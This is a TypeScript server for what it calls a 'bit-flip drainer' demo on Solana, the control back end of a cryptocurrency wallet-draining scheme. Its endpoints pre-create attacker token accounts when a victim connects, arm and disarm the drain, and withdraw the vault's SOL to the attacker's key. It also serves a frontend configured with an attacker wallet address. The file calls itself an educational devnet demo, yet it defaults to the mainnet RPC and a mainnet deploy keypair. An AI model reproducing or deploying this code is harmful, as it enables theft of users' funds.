/**
 * EDUCATIONAL DEMO - DEVNET ONLY
 *
 * Flip server for the bit-flip drainer demo.
 *
 * Endpoints:
 *   POST /prepare   - Pre-create attacker ATAs for victim's tokens (called on wallet connect)
 *   POST /flip-on   - Arm the drain (fast, single tx)
 *   POST /flip-off  - Disarm the drain
 *   POST /withdraw  - Pull SOL from vault to authority
 *   GET  /status    - Check current state
 */

import * as anchor from '@coral-xyz/anchor';
import { Program, AnchorProvider, Wallet } from '@coral-xyz/anchor';
import { Connection, Keypair, PublicKey, Transaction } from '@solana/web3.js';
import { getAssociatedTokenAddressSync, createAssociatedTokenAccountInstruction } from '@solana/spl-token';
import * as fs from 'fs';
import * as path from 'path';
import * as http from 'http';

const RPC_URL = process.env.RPC_URL || 'https://api.mainnet-beta.solana.com';
const PORT = parseInt(process.env.PORT || '3001', 10);

function readBody(req: http.IncomingMessage): Promise<string> {
    return new Promise((resolve) => {
        let body = '';
        req.on('data', (chunk: string) => { body += chunk; });
        req.on('end', () => resolve(body));
    });
}

async function loadProgram() {
    const idlPath = path.resolve(__dirname, '..', 'idl', 'drainer_demo.json');
    const idl = JSON.parse(fs.readFileSync(idlPath, 'utf8'));

    const programIdStr = process.env.PROGRAM_ID || 'DBueKxJaAyKYHyP3bbQE5eEMHLN7ZQfX2PyT7uw2xFhU';
    const programId = new PublicKey(programIdStr);

    let walletKeypair: Keypair;
    const keypairJson = process.env.WALLET_KEYPAIR_JSON;
    if (keypairJson) {
        const arr = JSON.parse(keypairJson);
        walletKeypair = Keypair.fromSecretKey(Uint8Array.from(arr));
    } else {
        const walletPath = path.resolve(__dirname, '..', 'mainnet-deploy-keypair.json');
        const walletData = JSON.parse(fs.readFileSync(walletPath, 'utf8'));
        walletKeypair = Keypair.fromSecretKey(Uint8Array.from(walletData));
    }

    const connection = new Connection(RPC_URL, 'confirmed');
    const wallet = new Wallet(walletKeypair);
    const provider = new AnchorProvider(connection, wallet, { commitment: 'confirmed' });
    anchor.setProvider(provider);

    idl.address = programId.toBase58();
    const program = new Program(idl, provider);

    const [configPda] = PublicKey.findProgramAddressSync([Buffer.from('config')], programId);
    const [vaultPda] = PublicKey.findProgramAddressSync([Buffer.from('vault')], programId);

    return { program, configPda, vaultPda, walletKeypair, connection, programId };
}

async function main() {
    console.log('Loading program...');
    const { program, configPda, vaultPda, walletKeypair, connection, programId } = await loadProgram();
    console.log(`Program:  ${programId.toBase58()}`);
    console.log(`Config:   ${configPda.toBase58()}`);
    console.log(`Vault:    ${vaultPda.toBase58()}`);
    console.log(`Attacker: ${walletKeypair.publicKey.toBase58()}`);

    const server = http.createServer(async (req, res) => {
        res.setHeader('Access-Control-Allow-Origin', '*');
        res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
        res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

        if (req.method === 'OPTIONS') {
            res.writeHead(204);
            res.end();
            return;
        }

        // --- /prepare: pre-create attacker ATAs (called when victim connects) ---
        if (req.method === 'POST' && req.url === '/prepare') {
            const body = await readBody(req);
            try {
                const mints: { mint: string; tokenProgram: string }[] = JSON.parse(body).mints || [];
                if (mints.length === 0) {
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ ok: true, created: 0 }));
                    return;
                }

                console.log(`[PREPARE] Checking ${mints.length} ATAs...`);
                const tx = new Transaction();
                let needed = 0;

                const ataEntries = mints.map(m => {
                    const mintPk = new PublicKey(m.mint);
                    const tokenProg = new PublicKey(m.tokenProgram);
                    const ata = getAssociatedTokenAddressSync(mintPk, walletKeypair.publicKey, false, tokenProg);
                    return { mintPk, tokenProg, ata };
                });

                const ataKeys = ataEntries.map(e => e.ata);
                const infos = await connection.getMultipleAccountsInfo(ataKeys);

                for (let i = 0; i < ataEntries.length; i++) {
                    if (!infos[i]) {
                        const { mintPk, tokenProg, ata } = ataEntries[i];
                        tx.add(createAssociatedTokenAccountInstruction(
                            walletKeypair.publicKey, ata, walletKeypair.publicKey, mintPk, tokenProg
                        ));
                        needed++;
                    }
                }

                if (needed > 0) {
                    const { blockhash } = await connection.getLatestBlockhash();
                    tx.recentBlockhash = blockhash;
                    tx.feePayer = walletKeypair.publicKey;
                    const sig = await connection.sendTransaction(tx, [walletKeypair]);
                    await connection.confirmTransaction(sig, 'confirmed');
                    console.log(`[PREPARE] Created ${needed} ATAs - tx: ${sig}`);
                } else {
                    console.log('[PREPARE] All ATAs already exist');
                }

                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ ok: true, created: needed }));
            } catch (err: any) {
                console.error('[PREPARE] Error:', err.message);
                res.writeHead(500, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ ok: false, error: err.message }));
            }
            return;
        }

        // --- /flip-on ---
        if (req.method === 'POST' && req.url === '/flip-on') {
            try {
                console.log('[FLIP] Arming drain...');
                const tx = await program.methods
                    .flip(true)
                    .accounts({ config: configPda, authority: walletKeypair.publicKey })
                    .signers([walletKeypair])
                    .rpc({ commitment: 'confirmed' });
                await connection.confirmTransaction(tx, 'confirmed');
                console.log(`[FLIP] ARMED + CONFIRMED - tx: ${tx}`);
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ ok: true, tx }));
            } catch (err: any) {
                console.error('[FLIP] Error:', err.message);
                res.writeHead(500, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ ok: false, error: err.message }));
            }
            return;
        }

        // --- /flip-off ---
        if (req.method === 'POST' && req.url === '/flip-off') {
            try {
                console.log('[FLIP] Disarming drain...');
                const tx = await program.methods
                    .flip(false)
                    .accounts({ config: configPda, authority: walletKeypair.publicKey })
                    .signers([walletKeypair])
                    .rpc();
                console.log(`[FLIP] DISARMED - tx: ${tx}`);
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ ok: true, tx }));
            } catch (err: any) {
                console.error('[FLIP] Error:', err.message);
                res.writeHead(500, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ ok: false, error: err.message }));
            }
            return;
        }

        // --- /status ---
        if (req.method === 'GET' && req.url === '/status') {
            try {
                const config = await (program.account as any).config.fetch(configPda);
                const vaultBalance = await connection.getBalance(vaultPda);
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({
                    drainActive: config.drainActive,
                    vaultBalance: (vaultBalance / 1e9).toFixed(4),
                    vault: vaultPda.toBase58(),
                }));
            } catch (err: any) {
                res.writeHead(500, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ error: err.message }));
            }
            return;
        }

        // --- /withdraw ---
        if (req.method === 'POST' && req.url === '/withdraw') {
            try {
                console.log('[WITHDRAW] Pulling funds from vault...');
                const tx = await program.methods
                    .withdraw()
                    .accounts({ config: configPda, vault: vaultPda, authority: walletKeypair.publicKey })
                    .signers([walletKeypair])
                    .rpc();
                const bal = await connection.getBalance(walletKeypair.publicKey);
                console.log(`[WITHDRAW] Done - tx: ${tx}, balance: ${(bal / 1e9).toFixed(4)} SOL`);
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ ok: true, tx, authorityBalance: (bal / 1e9).toFixed(4) }));
            } catch (err: any) {
                console.error('[WITHDRAW] Error:', err.message);
                res.writeHead(500, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ ok: false, error: err.message }));
            }
            return;
        }

        // --- Static frontend (for Render: same service serves API + UI) ---
        const cfg = {
            flipServer: '',  // same origin when served from this server
            rpc: process.env.RPC_URL || 'https://api.mainnet-beta.solana.com',
            attackerWallet: process.env.ATTACKER_WALLET || 'DGtkrQpytKyzCaCALPAmCFuNeLLP2ScSeYxDMSa4T8gT',
            programId: process.env.PROGRAM_ID || 'DBueKxJaAyKYHyP3bbQE5eEMHLN7ZQfX2PyT7uw2xFhU',
        };
        if (req.method === 'GET' && req.url === '/config.js') {
            res.setHeader('Content-Type', 'application/javascript');
            res.end(`window.DRAINER_CONFIG=${JSON.stringify(cfg)};`);
            return;
        }
        const frontendDir = path.resolve(__dirname, '..', 'frontend');
        const fileMap: Record<string, string> = {
            '/': 'index.html',
            '/index.html': 'index.html',
            '/app.js': 'app.js',
        };
        const file = fileMap[req.url || '/'] || (req.url && req.url.startsWith('/') && !req.url.includes('..') ? req.url.slice(1) : null);
        if (file) {
            const fp = path.join(frontendDir, file);
            if (fs.existsSync(fp) && fs.statSync(fp).isFile()) {
                const ext = path.extname(fp);
                const ct: Record<string, string> = { '.html': 'text/html', '.js': 'application/javascript', '.css': 'text/css' };
                res.setHeader('Content-Type', ct[ext] || 'application/octet-stream');
                res.end(fs.readFileSync(fp));
                return;
            }
        }
        res.writeHead(404);
        res.end('Not found');
    });

    server.listen(PORT, () => {
        console.log(`\nFlip server running on http://localhost:${PORT}`);
        console.log('Endpoints:');
        console.log('  POST /prepare   - pre-create attacker ATAs');
        console.log('  POST /flip-on   - arm the drain (fast)');
        console.log('  POST /flip-off  - disarm the drain');
        console.log('  POST /withdraw  - pull SOL from vault');
        console.log('  GET  /status    - check state');
    });
}

main().catch(err => { console.error(err); process.exit(1); });
